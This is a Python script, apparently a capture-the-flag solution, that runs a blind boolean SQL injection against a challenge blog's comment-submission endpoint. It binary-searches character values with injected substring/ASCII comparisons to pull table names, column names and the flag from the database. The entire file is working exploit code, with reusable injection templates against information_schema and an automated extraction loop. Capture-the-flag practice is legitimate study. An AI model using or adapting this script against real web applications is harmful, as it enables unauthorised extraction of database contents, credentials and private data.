import requests, urllib, re, sys, base64

url_base = "https://blog.pwning2017.p4.team"
url_login = url_base;
url_payload = url_base + "/submit";

sessid = requests.Session()

init_array = []
sillent = False
fancy_console = False

ASCIIAlphabet = "\001 !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
simpleAlphabet = "\001abcdefghijklmnopqrstuvwxyz"
HEXAlphabet = "\0010123456789abcdef"
advancedAlphabet= "\0010123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"

flag_payload = "Ascii(substring((SELECT flag FROM ctf_flag WHERE 1 LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"
tables_payload = "Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"

columns_ctf_payload = "Ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'ctf_flag' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@"
columns_blog_comments_payload = "Ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'spies' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@#"

def printInPlace(alert):
	if fancy_console:
		sys.stdout.write("{}{}".format(alert, "\b"*len(alert)))
		sys.stdout.flush();
	return fancy_console

def createPayload( query ):
	return {"post_id": query, "text": "##HEHE##", "who": "none" }

def sendPayload ( query ):
	if sillent == False: print ("exec: {}".format(query))
	payload = createPayload(query)
	add = sessid.post(url_payload, payload, allow_redirects=True)
	return findIDs(add.text)

def logIn():
	print ("loggin in: ")
	sessid.get(url_login, allow_redirects=True)
	return

def findIDs(text):
	regex = re.compile(r"(##HEHE##)")
	matches = regex.findall(text)
	return matches

def tryPayload(str):
	global init_array
	old_arr = len(init_array)
	init_array = sendPayload(str)
	return len(init_array) > old_arr

#bin-search ASCII inside [alphabet]
def findName(payload, alphabet):
	a = 0
	b = len(alphabet)-1
	while (a < b):
		mid = (a+b)//2
		c = alphabet[mid]
		printInPlace(c)
		if tryPayload(payload
			.replace("@cORD@", str(ord(c)))
			): a = mid + 1
		else:
			b = mid
	return alphabet[a]


def findNames(payload, alphabet):
	for result_offset in range(0, 10):
		result = ""
		pl = payload.replace("@rOFFSET@", str(result_offset))
		for word_offset in range(1, 40):
			pl2 = pl.replace("@wOFFSET@", str(word_offset))
			c = findName(pl2, alphabet)
			if c == alphabet[0]: break
			sys.stdout.write(c)
			sys.stdout.flush
			result+=c
		print(" ")
		if len(result) <= 1: break
	return


def findTables():
	print ("..:: Searching for table names ::..")
	findNames(tables_payload, advancedAlphabet)

def findSpiesrColumns():
	print ("..:: Searching for column names in user ::..")
	findNames(columns_spies_payload, advancedAlphabet)

def findCtfColumns():
	print ("..:: Searching for column names in point::..")
	findNames(columns_ctf_payload, advancedAlphabet)


def findFlag():
	print ("..:: Searching for Admin hash ::..")
	findNames(flag_payload, ASCIIAlphabet)



fancy_console = True # Turn on fancy terminal output
sillent = True # Turn off debugging mode
logIn();


#deletePoints();
#addPoints();
init_array = sendPayload("1");

print (init_array)
# findTables();
# findCtfColumns();
findFlag()
# findUsersColumns();
# findSpiesrColumns();
# findAdminHash();

# findAdminHash();

